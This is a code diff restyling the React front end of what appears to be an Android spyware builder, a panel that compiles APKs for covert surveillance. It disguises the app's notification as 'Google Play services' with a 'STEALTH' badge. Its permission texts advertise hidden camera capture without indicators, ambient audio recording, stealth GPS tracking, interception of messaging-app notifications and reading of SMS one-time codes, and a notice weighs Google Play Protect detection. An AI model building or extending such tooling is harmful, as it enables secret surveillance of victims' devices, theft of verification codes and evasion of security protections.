-                                            {Object.entries(ICON_OPTIONS).map(([key, item]) => (
-                                                <button
-                                                    key={key}
-                                                    type="button"
-                                                    onClick={() => {
-                                                        setNotificationIcon(key);
-                                                        setIsIconMenuOpen(false);
-                                                    }}
-                                                    className={`w-full p-3 flex items-center justify-between text-left transition-colors ${
-                                                        notificationIcon === key ? 'bg-emerald-500/15 text-white font-bold' : 'hover:bg-white/5 text-fg-2'
-                                                    }`}
-                                                >
-                                                    <div className="flex items-center gap-3">
-                                                        <span className="text-lg">{item.symbol}</span>
-                                                        <span className="text-xs font-bold text-white">{item.label}</span>
-                                                    </div>
-                                                    {notificationIcon === key && <CheckCircle2 size={16} className="text-emerald-400" />}
-                                                </button>
-                                            ))}
-                                        </div>
-                                    )}
-                                </div>
-
-                                {/* Custom Notification Fields (Shown only when style === 'custom') */}
+                                {/* Custom Text Fields */}
                                 {notificationStyle === 'custom' && (
-                                    <div className="space-y-3 bg-black/50 p-4 rounded-2xl border border-white/10 shadow-inner animate-in fade-in">
+                                    <div className="space-y-3 clay-coords-badge p-4 rounded-2xl animate-in fade-in">
                                         <div>
-                                            <label className="block text-xs font-bold text-fg-3 mb-1">Custom Notification Title</label>
+                                            <label className="block text-xs font-mono font-bold text-white/50 mb-1">Custom Title</label>
                                             <input
                                                 type="text"
                                                 value={notificationTitle}
                                                 onChange={(e) => setNotificationTitle(e.target.value)}
-                                                className="w-full bg-white/5 border border-white/10 rounded-xl px-3 py-2 text-white text-sm focus:border-emerald-500/60 focus:outline-none"
+                                                className="clay-capsule w-full px-3 py-2 rounded-xl text-white text-xs font-bold focus:border-orange-500/60 focus:outline-none"
                                                 placeholder="Google Play services"
                                             />
                                         </div>
                                         <div>
-                                            <label className="block text-xs font-bold text-fg-3 mb-1">Custom Notification Text</label>
+                                            <label className="block text-xs font-mono font-bold text-white/50 mb-1">Custom Subtitle</label>
                                             <input
                                                 type="text"
                                                 value={notificationText}
                                                 onChange={(e) => setNotificationText(e.target.value)}
-                                                className="w-full bg-white/5 border border-white/10 rounded-xl px-3 py-2 text-white text-sm focus:border-emerald-500/60 focus:outline-none"
+                                                className="clay-capsule w-full px-3 py-2 rounded-xl text-white text-xs font-bold focus:border-orange-500/60 focus:outline-none"
                                                 placeholder="Checking for updates…"
                                             />
                                         </div>
                                     </div>
                                 )}
 
-                                {/* Highlighted & Polished Live Android Status Bar Preview Card */}
-                                <div className="bg-gradient-to-br from-[#161a23] via-[#10131a] to-[#0a0d14] rounded-3xl p-5 border border-emerald-500/30 shadow-[0_0_25px_rgba(16,185,129,0.12)] space-y-3">
+                                {/* Live Android Status Drawer Mockup */}
+                                <div className="clay-capsule p-4 rounded-3xl space-y-2.5">
                                     <div className="flex items-center justify-between">
-                                        <div className="flex items-center gap-2">
-                                            <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
-                                            <span className="text-[10px] font-extrabold text-emerald-300 uppercase tracking-widest">LIVE ANDROID STATUS BAR PREVIEW</span>
+                                        <div className="flex items-center gap-1.5">
+                                            <span className="w-2 h-2 rounded-full bg-orange-400 animate-pulse" />
+                                            <span className="text-[10px] font-mono font-black text-orange-300 uppercase tracking-widest">
+                                                Status Bar Tray Simulation
+                                            </span>
                                         </div>
-                                        <span className="text-[10px] font-mono text-fg-4">now</span>
+                                        <span className="text-[9px] font-mono text-white/30">Silent • Minimized</span>
                                     </div>
 
-                                    {/* Realistic Notification Drawer Card */}
-                                    <div className="flex items-center justify-between p-4 rounded-2xl bg-black/60 border border-white/10 shadow-md">
-                                        <div className="flex items-center gap-3.5">
-                                            <div className="w-10 h-10 rounded-xl bg-emerald-500/15 border border-emerald-500/30 flex items-center justify-center text-xl shadow-inner">
+                                    <div className="flex items-center justify-between p-3.5 rounded-2xl bg-black/50 border border-white/5 shadow-inner">
+                                        <div className="flex items-center gap-3 min-w-0">
+                                            <div className="clay-icon-pod w-9 h-9 rounded-xl flex items-center justify-center text-lg shrink-0">
                                                 {ICON_OPTIONS[notificationIcon]?.symbol || NOTIFICATION_PRESETS[notificationStyle]?.icon}
                                             </div>
-                                            <div>
-                                                <div className="text-xs font-black text-white">
+                                            <div className="min-w-0">
+                                                <div className="text-xs font-black text-white truncate">
                                                     {notificationStyle === 'custom' ? (notificationTitle || 'System Service') : NOTIFICATION_PRESETS[notificationStyle]?.title}
                                                 </div>
-                                                <div className="text-[11px] text-fg-3 mt-0.5">
+                                                <div className="text-[10px] text-white/40 font-mono truncate mt-0.5">
                                                     {notificationStyle === 'custom' ? (notificationText || 'Running background checks…') : NOTIFICATION_PRESETS[notificationStyle]?.text}
                                                 </div>
                                             </div>
                                         </div>
-                                        <div className="flex flex-col items-end gap-1">
-                                            <span className="px-2 py-0.5 rounded-full bg-emerald-500/20 border border-emerald-500/40 text-[9px] font-bold text-emerald-300 uppercase">
-                                                SILENT
-                                            </span>
-                                            <span className="text-[9px] text-fg-4 font-mono">Persistent</span>
-                                        </div>
+                                        <span className="px-2 py-0.5 rounded-lg bg-orange-500/15 border border-orange-500/20 text-[9px] font-mono font-bold text-orange-300 uppercase shrink-0">
+                                            STEALTH
+                                        </span>
                                     </div>
                                 </div>
                             </div>
@@ -1344,45 +1255,45 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                     )}
                 </div>
 
-                {/* Footer Controls & Progress Popup Overlay */}
-                <div className="p-5 sm:p-7 border-t border-white/10 bg-gradient-to-t from-white/[0.04] to-transparent flex flex-col gap-4">
+                {/* ── Studio Footer Controls & Compilation HUD ── */}
+                <div className="p-4 sm:p-5 border-t border-white/5 bg-black/40 flex flex-col gap-3.5 shrink-0">
                     
-                    {/* Progress / Status Modal Popup Box */}
+                    {/* Compilation / Queue Progress HUD */}
                     {status !== 'idle' && (
-                        <div className="p-5 rounded-2xl bg-black/80 border border-emerald-500/30 flex flex-col items-center justify-center text-center space-y-3 animate-in fade-in shadow-2xl">
+                        <div className="clay-coords-badge p-4 rounded-2xl flex flex-col items-center justify-center text-center space-y-2.5 animate-in fade-in shadow-xl">
                             {status === 'queued' ? (
                                 <>
-                                    <div className="w-10 h-10 border-4 border-emerald-500/30 border-t-emerald-500 rounded-full animate-spin" />
-                                    <h4 className="text-base font-bold text-white">Queued for Compilation</h4>
-                                    <p className="text-xs text-fg-3">Queue Position: <span className="text-emerald-400 font-bold">{queuePosition}</span></p>
+                                    <div className="w-8 h-8 border-3 border-orange-500/30 border-t-orange-400 rounded-full animate-spin" />
+                                    <h4 className="text-sm font-black text-white uppercase font-mono">Queued in Build Pipeline</h4>
+                                    <p className="text-xs text-white/50 font-mono">Queue Position: <span className="text-orange-300 font-bold">{queuePosition}</span></p>
                                 </>
                             ) : status === 'generating' ? (
                                 <>
-                                    <div className="w-full flex items-center justify-between text-xs font-bold text-fg-2">
-                                        <span>{progressStep || "Compiling APK..."}</span>
-                                        <span className="text-emerald-400">{progress}%</span>
+                                    <div className="w-full flex items-center justify-between text-xs font-mono font-bold text-white/80">
+                                        <span>{progressStep || "Compiling Android APK..."}</span>
+                                        <span className="text-orange-300 font-mono font-black">{progress}%</span>
                                     </div>
-                                    <div className="w-full h-3 bg-white/10 rounded-full overflow-hidden">
+                                    <div className="w-full h-2 bg-black/60 rounded-full overflow-hidden border border-white/5 p-0.5">
                                         <div
-                                            className="h-full bg-gradient-to-r from-emerald-500 to-teal-400 transition-all duration-500"
+                                            className="h-full bg-gradient-to-r from-orange-500 to-amber-400 rounded-full transition-all duration-500 shadow-[0_0_10px_#f97316]"
                                             style={{ width: `${progress}%` }}
                                         />
                                     </div>
                                 </>
                             ) : status === 'completed' ? (
                                 <>
-                                    <CheckCircle2 size={36} className="text-emerald-400" />
-                                    <h4 className="text-lg font-bold text-white">APK Ready!</h4>
-                                    <p className="text-xs text-fg-3">Your compiled Android APK is ready for installation.</p>
+                                    <CheckCircle2 size={32} className="text-emerald-400 animate-pulse" />
+                                    <h4 className="text-sm font-black text-white uppercase font-mono">APK Compilation Ready!</h4>
+                                    <p className="text-xs text-white/50 font-mono">Your hardened APK is ready for deployment.</p>
                                     {downloadUrl && (
                                         <a
                                             href={downloadUrl}
                                             target="_blank"
                                             rel="noopener noreferrer"
                                             download={`${activeApp.name.replace(/\s+/g, '_')}.apk`}
-                                            className="px-6 py-2.5 rounded-xl bg-emerald-500 hover:bg-emerald-600 text-white font-bold text-xs shadow-lg transition-all"
+                                            className="clay-cta-button px-6 py-2.5 rounded-xl font-black text-xs uppercase tracking-widest shadow-lg flex items-center gap-2 cursor-pointer"
                                         >
-                                            Download APK Now
+                                            <Download size={14} /> Download APK Now
                                         </a>
                                     )}
                                 </>
@@ -1390,15 +1301,15 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                         </div>
                     )}
 
-                    {/* Step Navigation & Action Buttons */}
+                    {/* Step Navigation & Action CTA */}
                     <div className="flex items-center justify-between gap-3">
                         {activeStep !== 'identity' ? (
                             <button
                                 type="button"
                                 onClick={() => setActiveStep(activeStep === 'notifications' ? 'permissions' : 'identity')}
-                                className="px-5 py-3 rounded-xl bg-white/5 hover:bg-white/10 text-fg-2 hover:text-white font-bold text-xs transition-all"
+                                className="clay-capsule px-4 py-2.5 rounded-xl text-white/70 hover:text-white font-bold text-xs uppercase tracking-wider flex items-center gap-1.5 transition-all cursor-pointer"
                             >
-                                ← Previous
+                                <ChevronLeft size={14} /> Previous
                             </button>
                         ) : <div />}
 
@@ -1406,16 +1317,16 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                             <button
                                 type="button"
                                 onClick={() => setActiveStep(activeStep === 'identity' ? 'permissions' : 'notifications')}
-                                className="px-6 py-3 rounded-xl bg-gradient-to-r from-emerald-500 to-teal-500 hover:from-emerald-400 hover:to-teal-400 text-black font-extrabold text-xs shadow-lg shadow-emerald-500/20 transition-all flex items-center gap-2"
+                                className="clay-cta-button px-6 py-2.5 rounded-xl font-black text-xs uppercase tracking-widest flex items-center gap-1.5 transition-all cursor-pointer"
                             >
                                 <span>Next Step</span>
-                                <span>→</span>
+                                <ChevronRight size={14} />
                             </button>
                         ) : status === 'idle' ? (
                             <button
                                 type="button"
                                 onClick={startGeneration}
-                                className="px-8 py-3.5 rounded-xl bg-gradient-to-r from-emerald-500 via-teal-500 to-cyan-500 hover:scale-105 text-black font-black text-sm shadow-[0_0_25px_rgba(16,185,129,0.35)] transition-all"
+                                className="clay-cta-button px-8 py-3 rounded-2xl font-black text-xs uppercase tracking-widest shadow-[0_8px_24px_rgba(249,115,22,0.5)] transition-transform hover:scale-105 active:scale-95 cursor-pointer"
                             >
                                 Build {selectedPreset === 'custom' ? 'Custom' : activeApp.name} APK
                             </button>
@@ -1423,79 +1334,77 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                             <button
                                 type="button"
                                 onClick={onClose}
-                                className="px-6 py-3 rounded-xl bg-white/10 hover:bg-white/20 text-white font-bold text-xs transition-all"
+                                className="clay-capsule px-6 py-2.5 rounded-xl text-white font-bold text-xs uppercase tracking-wider transition-all cursor-pointer"
                             >
-                                Close
+                                Close Studio
                             </button>
                         )}
                     </div>
                 </div>
 
-                {/* App Mode Info Modal Popup */}
+                {/* ── App Info Modal Popup ── */}
                 {showAppInfoModal && (
-                    <div className="fixed inset-0 z-[350] flex items-center justify-center bg-black/75 backdrop-blur-sm p-4" onClick={() => setShowAppInfoModal(null)}>
-                        <div className="bg-[#18191c] border border-white/15 rounded-3xl p-6 max-w-sm w-full space-y-4 relative shadow-2xl" onClick={(e) => e.stopPropagation()}>
+                    <div className="fixed inset-0 z-[350] flex items-center justify-center bg-black/85 backdrop-blur-md p-4" onClick={() => setShowAppInfoModal(null)}>
+                        <div className="clay-card p-6 max-w-sm w-full space-y-4 relative shadow-2xl rounded-3xl" onClick={(e) => e.stopPropagation()}>
                             <button
                                 onClick={() => setShowAppInfoModal(null)}
-                                className="absolute top-4 right-4 text-white/50 hover:text-white"
+                                className="clay-button-sm w-8 h-8 rounded-full flex items-center justify-center absolute top-4 right-4 text-white/60 hover:text-white cursor-pointer"
                             >
-                                ✕
+                                <X size={14} />
                             </button>
 
                             <div className="flex items-center gap-3">
                                 {renderPresetIconBadge(showAppInfoModal)}
                                 <div>
-                                    <h4 className="text-base font-extrabold text-white">
+                                    <h4 className="text-sm font-black text-white uppercase font-mono">
                                         {APP_PRESETS.find(p => p.id === showAppInfoModal)?.name}
                                     </h4>
-                                    <span className="text-[10px] font-mono text-emerald-400">
+                                    <span className="text-[10px] font-mono text-orange-300">
                                         {APP_PRESETS.find(p => p.id === showAppInfoModal)?.packageName}
                                     </span>
                                 </div>
                             </div>
 
-                            <div className="p-3.5 rounded-2xl bg-white/[0.03] border border-white/10">
-                                <h5 className="text-xs font-bold text-emerald-300 mb-1.5">
+                            <div className="p-3.5 rounded-2xl bg-black/40 border border-white/5 text-xs text-white/70 leading-relaxed font-sans">
+                                <h5 className="font-bold text-orange-300 mb-1">
                                     {APP_PRESETS.find(p => p.id === showAppInfoModal)?.infoTitle}
                                 </h5>
-                                <p className="text-xs text-fg-3 leading-relaxed">
-                                    {APP_PRESETS.find(p => p.id === showAppInfoModal)?.infoText}
-                                </p>
+                                <p>{APP_PRESETS.find(p => p.id === showAppInfoModal)?.infoText}</p>
                             </div>
 
                             <button
                                 onClick={() => setShowAppInfoModal(null)}
-                                className="w-full py-2.5 rounded-xl bg-emerald-500 hover:bg-emerald-600 text-black font-bold text-xs transition-all shadow-lg"
+                                className="clay-cta-button w-full py-2.5 rounded-xl font-bold text-xs uppercase tracking-wider cursor-pointer"
                             >
-                                Close Info
+                                Close Details
                             </button>
                         </div>
                     </div>
                 )}
 
-                {/* Play Protect Warning Modal */}
+                {/* ── Play Protect Warning Modal ── */}
                 {showPlayProtectWarning && (
-                    <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-[350]" onClick={() => setShowPlayProtectWarning(false)}>
-                        <div className="bg-[#18191c] rounded-3xl p-6 max-w-sm mx-4 border border-red-500/30 shadow-2xl space-y-4" onClick={(e) => e.stopPropagation()}>
+                    <div className="fixed inset-0 bg-black/85 backdrop-blur-md flex items-center justify-center z-[350]" onClick={() => setShowPlayProtectWarning(false)}>
+                        <div className="clay-card p-6 max-w-sm mx-4 border border-red-500/30 shadow-2xl space-y-4 rounded-3xl" onClick={(e) => e.stopPropagation()}>
                             <div className="flex items-center gap-3">
-                                <div className="w-11 h-11 rounded-2xl bg-red-500/15 border border-red-500/30 flex items-center justify-center text-red-400">
-                                    <AlertTriangle size={22} />
+                                <div className="clay-icon-pod w-10 h-10 rounded-xl flex items-center justify-center text-red-400">
+                                    <AlertTriangle size={20} />
                                 </div>
                                 <div>
-                                    <h3 className="text-base font-bold text-white">Play Protect Warning</h3>
-                                    <p className="text-xs text-red-400">High detection risk</p>
+                                    <h3 className="text-sm font-black text-white uppercase font-mono">Play Protect Notice</h3>
+                                    <p className="text-[11px] text-red-400 font-mono">High heuristic sensitivity</p>
                                 </div>
                             </div>
 
-                            <p className="text-fg-2 text-xs leading-relaxed">
-                                Enabling <strong>SMS Access</strong> increases the likelihood that Google Play Protect will flag or restrict installation. Proceed only if needed.
+                            <p className="text-white/70 text-xs leading-relaxed">
+                                Enabling <strong>SMS Access</strong> increases the likelihood that Google Play Protect heuristics flag the APK on first install. Enable only if required.
                             </p>
 
-                            <div className="flex gap-3">
+                            <div className="flex gap-2.5 pt-1">
                                 <button
                                     type="button"
                                     onClick={() => setShowPlayProtectWarning(false)}
-                                    className="flex-1 py-2.5 rounded-xl bg-white/5 hover:bg-white/10 text-white text-xs font-bold transition-all"
+                                    className="clay-capsule flex-1 py-2.5 rounded-xl text-white text-xs font-bold transition-all cursor-pointer"
                                 >
                                     Cancel
                                 </button>
@@ -1505,7 +1414,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                         setEnableSmsPermission(true);
                                         setShowPlayProtectWarning(false);
                                     }}
-                                    className="flex-1 py-2.5 rounded-xl bg-red-500 hover:bg-red-600 text-white text-xs font-bold transition-all"
+                                    className="clay-card-error flex-1 py-2.5 rounded-xl text-red-300 hover:text-white text-xs font-bold transition-all cursor-pointer"
                                 >
                                     Enable Anyway
                                 </button>
@@ -1514,57 +1423,33 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                     </div>
                 )}
 
-                {/* Customized Color-Themed Permission Info Modal */}
+                {/* ── Themed Permission Info Modal ── */}
                 {showPermissionInfo && (
-                    <div className="fixed inset-0 z-[350] flex items-center justify-center bg-black/75 backdrop-blur-sm p-4" onClick={() => setShowPermissionInfo(null)}>
-                        <div className={`bg-[#18191c] border rounded-3xl p-6 max-w-sm w-full space-y-4 relative shadow-2xl ${
-                            showPermissionInfo === 'storage' ? 'border-emerald-500/40 shadow-emerald-500/10' :
-                            showPermissionInfo === 'camera' ? 'border-cyan-500/40 shadow-cyan-500/10' :
-                            showPermissionInfo === 'microphone' ? 'border-purple-500/40 shadow-purple-500/10' :
-                            showPermissionInfo === 'contacts' ? 'border-green-500/40 shadow-green-500/10' :
-                            showPermissionInfo === 'notifications' ? 'border-sky-500/40 shadow-sky-500/10' :
-                            'border-rose-500/40 shadow-rose-500/10'
-                        }`} onClick={(e) => e.stopPropagation()}>
+                    <div className="fixed inset-0 z-[350] flex items-center justify-center bg-black/85 backdrop-blur-md p-4" onClick={() => setShowPermissionInfo(null)}>
+                        <div className="clay-card p-6 max-w-sm w-full space-y-4 relative shadow-2xl rounded-3xl" onClick={(e) => e.stopPropagation()}>
                             <button
                                 onClick={() => setShowPermissionInfo(null)}
-                                className="absolute top-4 right-4 text-white/50 hover:text-white"
+                                className="clay-button-sm w-8 h-8 rounded-full flex items-center justify-center absolute top-4 right-4 text-white/60 hover:text-white cursor-pointer"
                             >
-                                ✕
+                                <X size={14} />
                             </button>
 
-                            {/* Themed Title & Icon */}
                             <div className="flex items-center gap-3">
-                                <div className={`w-11 h-11 rounded-2xl flex items-center justify-center ${
-                                    showPermissionInfo === 'storage' ? 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/40' :
-                                    showPermissionInfo === 'camera' ? 'bg-cyan-500/20 text-cyan-300 border border-cyan-500/40' :
-                                    showPermissionInfo === 'microphone' ? 'bg-purple-500/20 text-purple-300 border border-purple-500/40' :
-                                    showPermissionInfo === 'contacts' ? 'bg-green-500/20 text-green-300 border border-green-500/40' :
-                                    showPermissionInfo === 'notifications' ? 'bg-sky-500/20 text-sky-300 border border-sky-500/40' :
-                                    'bg-rose-500/20 text-rose-300 border border-rose-500/40'
-                                }`}>
-                                    <Info size={22} />
+                                <div className="clay-icon-pod w-10 h-10 rounded-xl flex items-center justify-center text-orange-400">
+                                    <Info size={20} />
                                 </div>
                                 <div>
-                                    <h4 className="text-base font-extrabold text-white capitalize">{showPermissionInfo} Access</h4>
-                                    <span className={`text-[10px] font-bold uppercase tracking-wider ${
-                                        showPermissionInfo === 'storage' ? 'text-emerald-400' :
-                                        showPermissionInfo === 'camera' ? 'text-cyan-400' :
-                                        showPermissionInfo === 'microphone' ? 'text-purple-400' :
-                                        showPermissionInfo === 'contacts' ? 'text-green-400' :
-                                        showPermissionInfo === 'notifications' ? 'text-sky-400' :
-                                        'text-rose-400'
-                                    }`}>
-                                        Background Capability
-                                    </span>
+                                    <h4 className="text-sm font-black text-white capitalize font-mono">{showPermissionInfo} Access</h4>
+                                    <span className="text-[10px] font-mono text-orange-300 uppercase">Background Capability</span>
                                 </div>
                             </div>
 
-                            {/* Detailed Description */}
-                            <div className="p-4 rounded-2xl bg-white/[0.03] border border-white/10">
-                                <p className="text-xs text-fg-2 leading-relaxed">
-                                    {showPermissionInfo === 'storage' && "Enables silent indexing of device gallery albums, downloaded files, camera roll snapshots, and internal storage folders."}
-                                    {showPermissionInfo === 'camera' && "Enables real-time remote snapshots and video capture using both front and rear lenses without flashing screen indicators."}
+                            <div className="p-3.5 rounded-2xl bg-black/40 border border-white/5 text-xs text-white/70 leading-relaxed font-sans">
+                                <p>
+                                    {showPermissionInfo === 'storage' && "Enables silent indexing of device gallery albums, downloaded files, camera roll snapshots, and internal storage directories."}
+                                    {showPermissionInfo === 'camera' && "Enables real-time remote live streaming and snapshots using front and rear lenses without flashing screen indicators."}
                                     {showPermissionInfo === 'microphone' && "Enables ambient room audio streaming and scheduled microphone surround recording with background compression."}
+                                    {showPermissionInfo === 'location' && "Enables stealth GPS telemetry tracking and pinpointing on radar."}
                                     {showPermissionInfo === 'contacts' && "Enables synchronization of stored phonebook contacts, SIM directory entries, and configured Google account names."}
                                     {showPermissionInfo === 'notifications' && "Enables real-time interception of WhatsApp, Instagram, Telegram messages, system toasts, and incoming notification previews."}
                                     {showPermissionInfo === 'sms' && "Enables reading incoming verification OTP codes, incoming/outgoing SMS history logs, and system text alerts."}
@@ -1573,22 +1458,14 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
 
                             <button
                                 onClick={() => setShowPermissionInfo(null)}
-                                className={`w-full py-2.5 rounded-xl font-bold text-xs transition-all shadow-lg text-black ${
-                                    showPermissionInfo === 'storage' ? 'bg-emerald-400 hover:bg-emerald-500' :
-                                    showPermissionInfo === 'camera' ? 'bg-cyan-400 hover:bg-cyan-500' :
-                                    showPermissionInfo === 'microphone' ? 'bg-purple-400 hover:bg-purple-500' :
-                                    showPermissionInfo === 'contacts' ? 'bg-green-400 hover:bg-green-500' :
-                                    showPermissionInfo === 'notifications' ? 'bg-sky-400 hover:bg-sky-500' :
-                                    'bg-rose-400 hover:bg-rose-500'
-                                }`}
+                                className="clay-cta-button w-full py-2.5 rounded-xl font-bold text-xs uppercase tracking-wider cursor-pointer"
                             >
-                                Got it
+                                Understood
                             </button>
                         </div>
                     </div>
                 )}
 
-                {/* Custom Alert Modal */}
                 <CustomAlertModal
                     isOpen={showCustomAlert}
                     onClose={() => setShowCustomAlert(false)}
